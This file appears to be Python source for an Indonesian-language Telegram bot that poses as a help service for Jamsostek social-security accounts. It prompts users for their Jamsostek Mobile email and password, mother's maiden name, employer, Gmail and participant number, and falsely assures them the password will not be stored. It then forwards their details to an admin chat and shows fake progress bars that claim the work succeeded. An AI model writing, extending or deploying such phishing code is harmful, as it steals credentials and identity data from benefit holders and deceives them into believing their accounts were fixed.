from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes, ConversationHandler
from config import ADMIN_CHAT_ID
from utils.database import save_user_data
import asyncio

# States
KODE_040_EMAIL, KODE_040_PASSWORD, KODE_040_KPJ = range(100, 103)
SUSPEND_EMAIL, SUSPEND_PASSWORD = range(110, 112)
UNLOCK_NAMA_IBU, UNLOCK_NAMA_PERUSAHAAN, UNLOCK_EMAIL, UNLOCK_PESERTA = range(120, 124)

# ============= KODE 040 =============
async def kode_040_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mulai proses Kode 040"""
    await update.callback_query.answer()
    
    text = """
🔑 *Silakan Masukkan Email Jamsostek Mobile Anda*

Contoh: nama@jamsostek.go.id
"""
    
    await update.callback_query.edit_message_text(text, parse_mode='Markdown')
    return KODE_040_EMAIL

async def kode_040_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima email untuk Kode 040"""
    email = update.message.text.strip()
    
    if '@' not in email:
        await update.message.reply_text("❌ Email tidak valid! Silakan coba lagi.")
        return KODE_040_EMAIL
    
    context.user_data['kode_040_email'] = email
    
    await update.message.reply_text(
        "🔐 *Silakan Masukkan Password Jamsostek Mobile Anda*\n\n"
        "⚠️ Password Anda aman dan tidak akan disimpan.",
        parse_mode='Markdown'
    )
    
    return KODE_040_PASSWORD

async def kode_040_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima password untuk Kode 040"""
    password = update.message.text.strip()
    
    context.user_data['kode_040_password'] = password
    
    await update.message.reply_text(
        "📅 *Masukkan Tahun KPJ*\n\n"
        "Contoh: 2020",
        parse_mode='Markdown'
    )
    
    return KODE_040_KPJ

async def kode_040_kpj(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima tahun KPJ"""
    tahun = update.message.text.strip()
    
    if not tahun.isdigit() or len(tahun) != 4:
        await update.message.reply_text("❌ Tahun tidak valid! Masukkan 4 digit tahun.")
        return KODE_040_KPJ
    
    context.user_data['kode_040_tahun'] = tahun
    
    # Simpan data
    user_data = {
        'type': 'kode_040',
        'email': context.user_data['kode_040_email'],
        'tahun_kpj': tahun,
        'phone': context.user_data.get('phone')
    }
    save_user_data(update.effective_user.id, user_data)
    
    # Kirim ke admin
    await send_to_admin(update, context, user_data)
    
    # Tampilkan progress
    await show_kode_040_progress(update)
    
    return ConversationHandler.END

async def show_kode_040_progress(update: Update):
    """Tampilkan progress Kode 040"""
    progress_text = """
╔═════════════════════════════════════╗
║     ⏳ PROSES BERLANGSUNG ⏳          ║
╚═════════════════════════════════════╝

✅ Data Anda telah diterima
✅ Proses dimulai sekarang

📊 Status Progress:
"""
    
    await update.message.reply_text(progress_text, parse_mode='Markdown')
    
    # Simulasi progress
    progress_stages = [
        ("🔄 Mengverifikasi akun...", 20),
        ("🔄 Memproses klaim...", 40),
        ("🔄 Mengisi data KPJ...", 60),
        ("🔄 Mengirim ke sistem...", 80),
        ("✅ Proses Selesai!", 100)
    ]
    
    for stage, percent in progress_stages:
        await asyncio.sleep(10)
        progress = "█" * (percent // 10) + "░" * (10 - percent // 10)
        await update.message.reply_text(
            f"{stage}\n{progress} {percent}%"
        )

# ============= SUSPEND KPJ =============
async def suspend_kpj_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mulai proses Suspend KPJ"""
    await update.callback_query.answer()
    
    text = """
🔑 *Masukkan Email Jamsostek Mobile Anda*

Untuk melepas suspend nomor KPJ
"""
    
    await update.callback_query.edit_message_text(text, parse_mode='Markdown')
    return SUSPEND_EMAIL

async def suspend_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima email untuk Suspend"""
    email = update.message.text.strip()
    context.user_data['suspend_email'] = email
    
    await update.message.reply_text("🔐 *Masukkan Password Jamsostek Mobile Anda*", parse_mode='Markdown')
    return SUSPEND_PASSWORD

async def suspend_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima password untuk Suspend"""
    password = update.message.text.strip()
    
    user_data = {
        'type': 'suspend_kpj',
        'email': context.user_data['suspend_email'],
        'phone': context.user_data.get('phone')
    }
    save_user_data(update.effective_user.id, user_data)
    
    await send_to_admin(update, context, user_data)
    
    # Tampilkan progress
    suspend_text = """
╔═════════════════════════════════════╗
║     ⏳ MEMBUKA SUSPEND KPJ ⏳        ║
╚═════════════════════════════════════╝

✅ Data Anda telah diterima

📊 Status Progress:
"""
    
    await update.message.reply_text(suspend_text, parse_mode='Markdown')
    
    progress_stages = [
        ("🔄 Mengakses akun...", 25),
        ("🔄 Mencari data suspend...", 50),
        ("🔄 Melepas suspend...", 75),
        ("✅ Suspend berhasil dilepas!", 100)
    ]
    
    for stage, percent in progress_stages:
        await asyncio.sleep(8)
        progress = "█" * (percent // 10) + "░" * (10 - percent // 10)
        await update.message.reply_text(f"{stage}\n{progress} {percent}%")
    
    return ConversationHandler.END

# ============= UNLOCK BIOMETRIK =============
async def unlock_biometrik_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mulai proses Unlock Biometrik"""
    await update.callback_query.answer()
    
    text = """
👤 *Masukkan Nama Ibu Kandung Anda*

Ini diperlukan untuk verifikasi data pribadi.
"""
    
    await update.callback_query.edit_message_text(text, parse_mode='Markdown')
    return UNLOCK_NAMA_IBU

async def unlock_nama_ibu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima nama ibu"""
    context.user_data['unlock_nama_ibu'] = update.message.text.strip()
    
    await update.message.reply_text("🏢 *Masukkan Nama Perusahaan Anda*", parse_mode='Markdown')
    return UNLOCK_NAMA_PERUSAHAAN

async def unlock_nama_perusahaan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima nama perusahaan"""
    context.user_data['unlock_nama_perusahaan'] = update.message.text.strip()
    
    await update.message.reply_text("📧 *Masukkan Gmail Aktif Anda*", parse_mode='Markdown')
    return UNLOCK_EMAIL

async def unlock_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima email"""
    context.user_data['unlock_email'] = update.message.text.strip()
    
    await update.message.reply_text("👤 *Masukkan Nomor Peserta (NIPP)*", parse_mode='Markdown')
    return UNLOCK_PESERTA

async def unlock_peserta(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima nomor peserta"""
    peserta = update.message.text.strip()
    
    user_data = {
        'type': 'unlock_biometrik',
        'nama_ibu': context.user_data['unlock_nama_ibu'],
        'nama_perusahaan': context.user_data['unlock_nama_perusahaan'],
        'email': context.user_data['unlock_email'],
        'nomor_peserta': peserta,
        'phone': context.user_data.get('phone')
    }
    save_user_data(update.effective_user.id, user_data)
    
    await send_to_admin(update, context, user_data)
    
    confirmation_text = """
╔═════════════════════════════════════╗
║     ✅ DATA BERHASIL DIKIRIM ✅      ║
╚═════════════════════════════════════╝

📋 Data Anda:
• Nama Ibu: {nama_ibu}
• Perusahaan: {nama_perusahaan}
• Email: {email}
• Nomor Peserta: {peserta}

✅ Tim kami akan memproses dalam 1x24 jam.

Terima kasih! 🙏
""".format(**user_data)
    
    await update.message.reply_text(confirmation_text, parse_mode='Markdown')
    
    return ConversationHandler.END

async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, user_data):
    """Kirim data ke admin"""
    try:
        user = update.effective_user
        
        admin_message = f"""
📬 *DATA BARU MASUK*

👤 User: {user.first_name or ''} {user.last_name or ''}
🆔 User ID: {user.id}
📞 Phone: {user_data.get('phone', 'Tidak ada')}

📋 Tipe Layanan: {user_data.get('type', 'Unknown')}
📊 Data Lengkap:
"""
        
        # Tambahkan detail sesuai tipe
        if user_data.get('type') == 'kode_040':
            admin_message += f"""
• Email: {user_data.get('email')}
• Tahun KPJ: {user_data.get('tahun_kpj')}
"""
        elif user_data.get('type') == 'suspend_kpj':
            admin_message += f"""
• Email: {user_data.get('email')}
"""
        elif user_data.get('type') == 'unlock_biometrik':
            admin_message += f"""
• Nama Ibu: {user_data.get('nama_ibu')}
• Nama Perusahaan: {user_data.get('nama_perusahaan')}
• Email: {user_data.get('email')}
• Nomor Peserta: {user_data.get('nomor_peserta')}
"""
        
        admin_message += "\nSilakan proses segera."
        
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_message,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        print(f"Error sending to admin: {e}")
